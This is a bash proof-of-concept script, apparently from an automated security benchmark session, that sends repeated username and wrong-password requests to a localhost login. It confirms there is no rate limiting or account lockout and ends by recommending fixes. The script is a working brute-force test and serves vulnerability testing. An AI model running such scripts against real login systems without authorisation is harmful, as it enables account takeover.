#!/bin/bash
# POC: Demonstrates missing rate limiting on authentication endpoints enabling brute force attacks - tests 15 rapid username submissions, 15 failed password attempts, verifies no account lockout, and analyzes response times
# Target: ./repo
# Created: 2025-10-30T20:06:05.007Z
# Session: benchmark-XBEN-001-24-mhdu3kmr

echo "=================================================="
echo "POC: Missing Rate Limiting Enables Brute Force"
echo "=================================================="
echo ""
echo "This POC demonstrates that the authentication system"
echo "lacks rate limiting, allowing unlimited brute force attempts."
echo ""

TARGET_URL="http://localhost:8082"
USERNAME="test"
USER_ID="10032"

# Test 1: Rapid username submissions (Step 1 of auth)
echo "[Test 1] Username Enumeration Endpoint - 15 rapid requests"
echo "-----------------------------------------------------------"
echo "Endpoint: POST /"
echo "Testing: 15 consecutive username submissions"
echo ""

success_count=0
for i in {1..15}; do
    response=$(curl -s -X POST \
        -d "username=${USERNAME}" \
        -w "\n%{http_code}" \
        "${TARGET_URL}/" \
        -o /dev/null 2>&1)
    
    http_code=$(echo "$response" | tail -n 1)
    
    if [ "$http_code" = "302" ] || [ "$http_code" = "200" ]; then
        success_count=$((success_count + 1))
    fi
    
    echo "  Attempt $i: HTTP $http_code"
done

echo ""
echo "Result: $success_count/15 requests accepted without rate limiting"
echo ""

# Test 2: Failed password attempts (Step 2 of auth)
echo "[Test 2] Password Authentication - 15 failed login attempts"
echo "------------------------------------------------------------"
echo "Endpoint: POST /password/${USERNAME}"
echo "Testing: 15 consecutive FAILED password attempts"
echo ""

failed_attempts=0
passwords=("wrong1" "wrong2" "wrong3" "wrong4" "wrong5" "wrong6" "wrong7" "wrong8" "wrong9" "wrong10" "wrong11" "wrong12" "wrong13" "wrong14" "wrong15")

for i in {0..14}; do
    response=$(curl -s -X POST \
        -d "username=${USERNAME}&user_id=${USER_ID}&password=${passwords[$i]}" \
        -w "\n%{http_code}" \
        "${TARGET_URL}/password/${USERNAME}" \
        -L 2>&1 | tail -n 1)
    
    # All failed attempts should return 302 redirect
    if [ "$response" = "302" ] || [ "$response" = "200" ]; then
        failed_attempts=$((failed_attempts + 1))
    fi
    
    echo "  Attempt $((i+1)) with password '${passwords[$i]}': HTTP $response"
done

echo ""
echo "Result: $failed_attempts/15 failed attempts accepted without blocking"
echo ""

# Test 3: Verify no account lockout
echo "[Test 3] Account Lockout Test"
echo "------------------------------"
echo "After 15 failed attempts, testing if account is still accessible..."
echo ""

response=$(curl -s -X POST \
    -d "username=${USERNAME}&user_id=${USER_ID}&password=test" \
    -w "\n%{http_code}" \
    "${TARGET_URL}/password/${USERNAME}" \
    -L 2>&1)

http_code=$(echo "$response" | tail -n 1)
body=$(echo "$response" | head -n -1)

if echo "$body" | grep -q "dashboard\|Orders\|Welcome" || [ "$http_code" = "302" ]; then
    echo "✗ VULNERABLE: Account still accessible after 15 failed attempts"
    echo "  HTTP Status: $http_code"
    echo "  Login still works - NO ACCOUNT LOCKOUT"
else
    echo "✓ Account locked or protected"
fi

echo ""

# Test 4: Timing analysis
echo "[Test 4] Response Time Analysis (No Progressive Delays)"
echo "--------------------------------------------------------"
echo "Testing if failed attempts have progressive delays..."
echo ""

for i in {1..5}; do
    start_time=$(date +%s%N)
    
    curl -s -X POST \
        -d "username=${USERNAME}&user_id=${USER_ID}&password=wrongpass${i}" \
        "${TARGET_URL}/password/${USERNAME}" \
        -o /dev/null 2>&1
    
    end_time=$(date +%s%N)
    duration=$(( (end_time - start_time) / 1000000 ))
    
    echo "  Attempt $i: ${duration}ms"
done

echo ""
echo "Result: Response times should be consistent (no progressive delays)"
echo ""

# Summary
echo "=================================================="
echo "VULNERABILITY SUMMARY"
echo "=================================================="
echo ""
echo "✗ No rate limiting on username submission (15/15 requests accepted)"
echo "✗ No rate limiting on password attempts (15/15 failed attempts accepted)"
echo "✗ No account lockout after 15+ failed attempts"
echo "✗ No progressive delays to slow down attackers"
echo "✗ No CAPTCHA challenge triggered"
echo ""
echo "IMPACT: Brute force attacks are feasible"
echo "- Known username: test"
echo "- Unlimited password attempts: ✓"
echo "- No detection/prevention: ✓"
echo "- Can test 100+ passwords per minute: ✓"
echo ""
echo "RECOMMENDATION: Implement rate limiting, account lockout,"
echo "progressive delays, and CAPTCHA after failed attempts."
echo "=================================================="